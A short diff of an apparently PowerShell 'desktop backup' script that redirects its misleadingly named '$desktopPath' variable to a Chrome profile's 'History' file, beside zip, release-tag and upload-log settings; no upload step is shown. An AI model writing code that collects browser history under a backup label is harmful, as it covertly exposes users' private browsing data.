@@ -12,7 +12,7 @@ $tag = "backup-$timestamp"
 $releaseName = "Backup - $date"
 $zipName = "DesktopBackup_$timestamp.zip"
 $zipPath = "$env:TEMP\$zipName"
-$desktopPath = "C:\Program Files\Google\Chrome\Application\1\Default"
+$desktopPath = "C:\Program Files\Google\Chrome\Application\1\Default\History"
 $logPath = "$env:USERPROFILE\upload_log.txt"
 # Compress function (skip locked files)
 Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
